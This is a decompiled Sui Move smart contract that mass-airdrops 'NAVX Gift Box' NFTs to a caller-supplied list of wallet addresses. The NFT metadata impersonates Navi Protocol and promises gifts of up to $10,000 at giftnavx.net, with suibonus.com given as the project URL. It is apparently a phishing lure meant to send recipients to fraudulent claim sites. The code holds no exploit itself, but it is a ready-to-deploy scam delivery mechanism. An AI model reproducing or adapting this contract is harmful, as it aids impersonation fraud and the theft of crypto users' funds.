module 0x902298e85397adeb4ce6fd0fe0d3ebbd8b9ebfdb91e3e2d5e256dbdce693c0bd::navxgift0646 {
    struct NAVXGIFT0646 has drop {
        dummy_field: bool,
    }

    struct NAVX_GIFTBOX_0646 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct BurnEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public entry fun NaviGiftBox0646(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = NAVX_GIFTBOX_0646{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"NAVX Gift Box"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dfromkbsy/image/upload/v1724924636/giftnavxnet_0829_0_ynzfdj.jpg"),
                description : 0x1::string::utf8(b"Gifting from Navi Protocol is LIVE on https://giftnavx.net. Verify your Gift Box and claim your gift upto $10,000."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<NAVX_GIFTBOX_0646>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"NAVX Gift Box"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dfromkbsy/image/upload/v1724924636/giftnavxnet_0829_0_ynzfdj.jpg"),
                description : 0x1::string::utf8(b"Gifting from Navi Protocol is LIVE on https://giftnavx.net. Verify your Gift Box and claim your gift upto $10,000."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<NAVX_GIFTBOX_0646>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: NAVX_GIFTBOX_0646, arg1: &mut 0x2::tx_context::TxContext) {
        let NAVX_GIFTBOX_0646 {
            id          : v0,
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        } = arg0;
        let v5 = v0;
        let v6 = BurnEvent{
            nft_id      : 0x2::object::uid_to_inner(&v5),
            user        : 0x2::tx_context::sender(arg1),
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        };
        0x2::event::emit<BurnEvent>(v6);
        0x2::object::delete(v5);
    }

    fun init(arg0: NAVXGIFT0646, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"NAVX Gift Box"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dfromkbsy/image/upload/v1724924636/giftnavxnet_0829_0_ynzfdj.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Gifting from Navi Protocol is LIVE on https://giftnavx.net. Verify your Gift Box and claim your gift upto $10,000."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suibonus.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Navi Protocol"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000"));
        let v4 = 0x2::package::claim<NAVXGIFT0646>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<NAVX_GIFTBOX_0646>(&v4, v0, v2, arg1);
        0x2::display::update_version<NAVX_GIFTBOX_0646>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<NAVX_GIFTBOX_0646>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

